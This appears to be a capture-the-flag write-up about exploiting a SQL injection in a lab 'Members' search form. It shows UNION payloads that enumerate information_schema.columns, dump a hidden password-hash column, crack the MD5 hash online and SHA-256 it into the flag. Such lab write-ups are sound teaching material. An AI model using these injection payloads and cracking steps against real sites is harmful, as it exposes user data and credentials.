Steps:
1. Typing 1 gives us the result:

ID: 1
First name: one
Surname : me

So, we can see that the approximate SQL-query is
SELECT firts_name, last_name FROM users WHERE user_id = 1;

Now we know that we've got some table in a database that contains at least 3 pieces of information related to a member: an ID (the value we type), a first name, and a surname.

2. Typing a char symbol (like 'a', without a quotes) or some string, we get a database runtime error:

Unknown column 'a' in 'where clause'

So the engine treats that input as a column name (an identifier in the SQL query), not as a text value

3. Typing any other symbol gives us an SQL syntax error:

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1

This means our input is breaking the SQL statement itself, so the database cannot even parse it as valid syntax.

4. As we try to exploit the database, it is expected that there are some other columns, not only those we can see when typing in a provided form. Typing any symbol gives us the error of MariaDB. Every MariaDB database management system contains a table called information_schema.columns that lists metadata of every column in every table in a database. So we can use this information to know the exact name of our table and its columns as well.

To do so we will use the UNION injection that comes from query:

SELECT column_name, table_name
FROM information_schema.columns;

Here we use the common columns from information_schema.columns among the others we can find in MySQL documentation (https://dev.mysql.com/doc/refman/9.7/en/information-schema-columns-table.html).

In our case it will be 

1 UNION
SELECT column_name, table_name
FROM information_schema.columns;

Among the results we should find something connected to our database by sense. As the page name is called "Members", we are looking for something like that, so we suppose that the name users (represented in a "Surname" field) definitely could be the name of our table.

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
First name: user_id
Surname : users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
First name: first_name
Surname : users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
First name: last_name
Surname : users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
First name: town
Surname : users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
First name: country
Surname : users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
First name: planet
Surname : users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
First name: Commentaire
Surname : users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
First name: countersign
Surname : users

5. As we can see there are 8 columns in our table:

user_id
first_name
last_name
town
country
planet
Commentaire
countersign

The same UNION injection as above can show us the content of each of them, so we take the two most interesting ones and type an injection:

1 UNION
SELECT Commentaire, countersign
FROM users;

And we get, among the others:

ID: 1 UNION SELECT Commentaire, countersign FROM users; 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

6. So to decrypt the provided password we use a public online source:

https://md5decrypt.net/

For the hash we obtained:

5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo

Then we lower all the characters: fortytwo

The final step is to encrypt it with SHA‑256, using the command:

echo -n fortytwo | sha256sum

And here we are: 
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5